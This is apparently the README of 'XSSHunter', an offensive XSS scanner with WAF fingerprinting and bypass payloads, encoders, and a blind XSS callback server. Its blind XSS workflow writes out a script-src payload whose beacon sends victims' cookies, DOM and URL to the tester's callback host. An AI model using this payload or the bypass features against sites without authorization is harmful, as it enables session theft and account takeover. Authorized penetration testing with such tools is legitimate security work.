<div align="center">

# 🎯 XSSHunter

### Advanced XSS Hunter

**500+ payloads · WAF bypass · DOM verification · Blind XSS · Context-aware**

[![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)](https://go.dev)
[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-0.1.0-blue.svg)](#)

</div>

---

## 📖 Overview

**XSSHunter** is a high-performance, hybrid XSS scanner that combines:

- 🚀 **Go core** — blazing-fast concurrent HTTP engine, crawler, payload firing, blind XSS callback server, WAF fingerprinting
- 🧠 **Python brain** — context detection, payload encoding/mutation, DOM verification via Playwright, rich reporting

The result: **speed of Go** + **intelligence of Python** in a single tool.

> ⚠️ **For authorized security testing only.** Use only against targets you have explicit permission to test.

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🕷️ **Smart Crawler** | Colly-based, JS-aware, extracts endpoints + params + forms |
| 🎯 **Context Detection** | 10 contexts — HTML, attr (double/single/unquoted), JS string, template, comment, URL |
| 💥 **500+ Payloads** | Categorized — reflected, DOM, blind, polyglots, mXSS, framework-specific |
| 🔐 **13 Encoders** | URL, double URL, HTML entity (dec/hex/named), unicode, hex, base64, mixed case, whitespace |
| 🛡️ **WAF Bypass** | 10 WAFs fingerprinted — Cloudflare, Akamai, AWS, Imperva, Sucuri, F5, ModSecurity, Wordfence, Barracuda, FortiWeb |
| 🎭 **DOM Verification** | Playwright — actual JS execution proof + screenshots |
| 🕵️ **Blind XSS** | Callback server — cookies, DOM, URL, IP, UA captured |
| ⚡ **Concurrent Firing** | Up to 200 workers, ~10k requests/min |
| 📊 **Rich Reports** | JSON + HTML + per-finding PoC (one-click reproduce) |
| 🎨 **CLI + Dashboard** | Typer + Rich, beautiful terminal output |

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                  CLI (Typer + Rich)                     │
└──────────────────────┬──────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────┐
│           Python Brain (Intelligence Layer)             │
│  Context · Payloads · Encoders · DOM (Playwright)       │
│  Report · Orchestrator                                  │
└──────────────────────┬──────────────────────────────────┘
                       │ HTTP/JSON
┌──────────────────────▼──────────────────────────────────┐
│              Go Core (Performance Layer)                │
│  Crawler · Injector · Callback Server · WAF             │
└─────────────────────────────────────────────────────────┘
```

**Communication:** Simple REST over `127.0.0.1:8080` (API) + `127.0.0.1:8888` (callbacks)

---

---

## ⚡ Quick Start

### One-Command Install + Run

```bash
git clone https://github.com/Athexblackhat2/xsshunter.git
cd xsshunter
chmod +x install.sh
./install.sh scan -u https://your-target.com
```

That's it. The script:
1. ✅ Checks Go + Python
2. ✅ Builds Go core
3. ✅ Creates Python venv + installs deps
4. ✅ Installs Playwright Chromium
5. ✅ Starts Go core in background
6. ✅ Runs the scan

---

## 🔧 Manual Installation

### Prerequisites

- **Go** 1.22+ — [install](https://go.dev/dl/)
- **Python** 3.10+ — [install](https://python.org)
- **pip** + **venv**

### Step 1 — Build Go core

```bash
go mod tidy
go build -o xsshunter-core ./go-core
```

### Step 2 — Setup Python

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python -m playwright install chromium
```

### Step 3 — Start Go core

```bash
./xsshunter-core --port 8080 --callback-port 8888
```

### Step 4 — Run scans

```bash
cd py-brain
python main.py scan -u https://target.com
```

---

## 🎯 Usage

### Full Scan

```bash
python main.py scan -u https://target.com \
    --waf-bypass \
    --dom \
    -o report.json
```

### With Authentication

```bash
python main.py scan -u https://target.com \
    -H "Cookie: session=abc123" \
    -H "Authorization: Bearer xyz"
```

### Quick Fire (no crawl)

```bash
python main.py fire \
    -u https://target.com/search \
    -p q \
    -c html \
    --waf-bypass
```

### Crawl Only

```bash
python main.py crawl -u https://target.com -d 2 --max-pages 200
```

### Payload DB

```bash
python main.py payloads --list
python main.py payloads -c attr_double
python main.py payloads -s "svg"
```

### Blind XSS

```bash
# Watch live callbacks
python main.py callback watch

# List captured
python main.py callback list

# Clear
python main.py callback clear
```

---

## 📖 CLI Commands

| Command | Description |
|---------|-------------|
| `scan` | Full pipeline: crawl → context → fire → DOM → report |
| `crawl` | Crawl only, list endpoints |
| `fire` | Quick fire against single URL |
| `payloads` | Inspect payload DB |
| `callback` | Manage blind XSS callbacks |
| `banner` | Show ASCII banner |
| `version` | Show version |

### `scan` Options

| Flag | Default | Description |
|------|---------|-------------|
| `-u, --url` | *required* | Target URL |
| `-d, --depth` | `2` | Crawl depth |
| `--max-pages` | `100` | Max pages |
| `-w, --workers` | `50` | Concurrent workers (max 200) |
| `-H, --header` | — | Custom header (repeatable) |
| `--waf-bypass / --no-waf-bypass` | `True` | WAF bypass payloads |
| `--dom / --no-dom` | `True` | DOM execution verify |
| `-o, --output` | — | Save JSON report |
| `--go-core` | `http://127.0.0.1:8080` | Go core URL |
| `--callback` | `http://127.0.0.1:8888` | Callback URL |

---

## 🔐 Encoders (13)

| Name | Input | Output |
|------|-------|--------|
| `raw` | `<svg>` | `<svg>` |
| `url` | `<svg>` | `%3Csvg%3E` |
| `url2` | `<svg>` | `%253Csvg%253E` |
| `url_plus` | `<svg>` | `%3Csvg%3E` |
| `html_dec` | `<svg>` | `&#60;svg&#62;` |
| `html_hex` | `<svg>` | `&#x3c;svg&#x3e;` |
| `html_named` | `<svg>` | `&lt;svg&gt;` |
| `unicode` | `<svg>` | `\u003csvg\u003e` |
| `hex_js` | `<svg>` | `\x3csvg\x3e` |
| `base64` | `<svg>` | `PHN2Zz4=` |
| `mixed_case` | `<script>` | `<ScRiPt>` |
| `whitespace` | `<svg onload>` | `<svg\t/**/onload>` |

---

## 🎯 Context Types

| Context | Example | Confidence |
|---------|---------|-----------|
| `html` | `<div>PAYLOAD</div>` | 75 |
| `attr_double` | `value="PAYLOAD"` | 90 |
| `attr_single` | `value='PAYLOAD'` | 90 |
| `attr_unquoted` | `value=PAYLOAD` | 70 |
| `js_string_single` | `var x = 'PAYLOAD'` | 85 |
| `js_string_double` | `var x = "PAYLOAD"` | 85 |
| `js_template` | `` var x = `PAYLOAD` `` | 85 |
| `script_block` | `<script>PAYLOAD</script>` | 80 |
| `comment` | `<!-- PAYLOAD -->` | 90 |
| `url` | `href="PAYLOAD"` | 60 |

---

## 🛡️ Supported WAFs

| WAF | Detection Signals |
|-----|-------------------|
| **Cloudflare** | `CF-RAY`, `__cf_bm`, "Attention Required!" |
| **Akamai** | `X-Akamai-*`, `ak_bmsc` |
| **AWS WAF** | `X-Amzn-*`, `awsalb` cookie |
| **Imperva Incapsula** | `X-Iinfo`, `incap_ses_` |
| **Sucuri** | `X-Sucuri-ID`, `sucuri_cloudproxy_uuid_` |
| **F5 BIG-IP** | `X-WA-Info`, `bigipserver` |
| **ModSecurity** | `406 Not Acceptable`, "not acceptable" |
| **Wordfence** | `wfvt_` cookie |
| **Barracuda** | `barra_counter_session` |
| **Fortinet FortiWeb** | `cookiesession1` |

Each WAF has **vendor-specific bypass payloads** built-in.

---

## 📊 Sample Output

```
[1/5] Crawling...
      → 47 endpoints found
[2/5] Detecting context...
      → {'html': 12, 'attr_double': 8, 'js_string_single': 5, 'unknown': 22}
[3/5] Building payloads...
      → 184 unique payloads
[4/5] Firing payloads...
      → 8648 requests, 23 reflected
[5/5] Verifying DOM execution...
      → 7 confirmed XSS

╭─ Scan Summary ─────────────╮
│ Confirmed XSS  7           │
╰────────────────────────────╯

[+] Reports saved to: ./reports/target_com_20261007_143022
    ├── findings.json
    ├── report.html
    ├── poc_1.html
    └── ...
```

---

**Each PoC includes:**
- Clickable reproduce URL
- `curl` command
- Dialog/DOM evidence
- Response snippet
- Screenshot (if captured)

---

## 🎭 Blind XSS Workflow

```
1. Python: token = GenerateToken()
   payload = "<script src={CALLBACK}/c/TOKEN></script>"

2. Payload inject into target (comment form, feedback, etc.)

3. Victim (admin) opens page → payload fires
   → GET /c/TOKEN → logs IP, UA, cookies, referer
   → Beacon JS loads → POST /data/TOKEN with cookies, DOM, URL

4. CLI: python main.py callback watch
   → Real-time alerts
```

---

## 🧪 Example Scan

```bash
# Basic
./install.sh scan -u https://testphp.vulnweb.com

# Full featured
./install.sh scan \
    -u https://testphp.vulnweb.com \
    -d 3 \
    --max-pages 200 \
    -w 100 \
    --waf-bypass \
    --dom \
    -o report.json

# With auth
./install.sh scan \
    -u https://app.example.com/dashboard \
    -H "Cookie: session=abc123" \
    -H "X-API-Key: xyz"
```

---

## ⚙️ Configuration

### Go Core

```bash
./xsshunter-core \
    --port 8080 \
    --callback-port 8888 \
    --callback-host 0.0.0.0     # expose callbacks externally
```

### Environment

`.env` file (optional):
```env
GO_CORE=http://127.0.0.1:8080
CALLBACK_BASE=http://127.0.0.1:8888
DEFAULT_WORKERS=50
```

---

## 🐛 Troubleshooting

| Problem | Fix |
|---------|-----|
| `Go core not reachable` | Check `go-core.log`, restart with `./xsshunter-core` |
| `Playwright not found` | Run `python -m playwright install chromium` |
| `pip install fails` | Upgrade pip: `pip install --upgrade pip` |
| Port in use | `lsof -ti:8080 \| xargs kill -9` |
| No callbacks received | Ensure callback port is publicly reachable (ngrok for external) |
| False positives | Disable `--dom` (only execution-verified shown) |

---

## 🚀 Performance Tips

| Goal | Setting |
|------|---------|
| **Fastest scan** | `-w 200 --no-dom` |
| **Most accurate** | `-w 50 --dom --waf-bypass` |
| **Quiet mode** | `-q` (no banner) |
| **Large targets** | `--max-pages 1000 -d 5` |
| **Auth scans** | `-H "Cookie: ..."` |
| **Rate-limit safe** | `-w 10` |

---

---

## ⚖️ Legal & Ethics

This tool is for **authorized security testing only**:

- ✅ Your own applications
- ✅ Bug bounty programs (in-scope targets)
- ✅ Client engagements (written permission)
- ✅ Lab environments (DVWA, PortSwigger Academy, XSS-labs)

**Never** use against:
- ❌ Targets without written permission
- ❌ Public websites you don't own
- ❌ Anything illegal under your jurisdiction

The authors assume **no liability** for misuse.

---

## 👥 Author

**ATHEX BLACK HAT**

---

## 📜 License

MIT License — see [LICENSE](LICENSE) for details.

---

## 🙏 Acknowledgments

- [Colly](https://github.com/gocolly/colly) — crawler
- [fasthttp](https://github.com/valyala/fasthttp) — HTTP engine
- [Playwright](https://playwright.dev) — browser automation
- [Typer](https://typer.tiangolo.com) + [Rich](https://rich.readthedocs.io) — CLI
- [OWASP](https://owasp.org) — testing methodology

---

<div align="center">

**⭐ Star this repo if it helped you!**

Made with 🔥 by ATHEX BLACK HAT

</div>
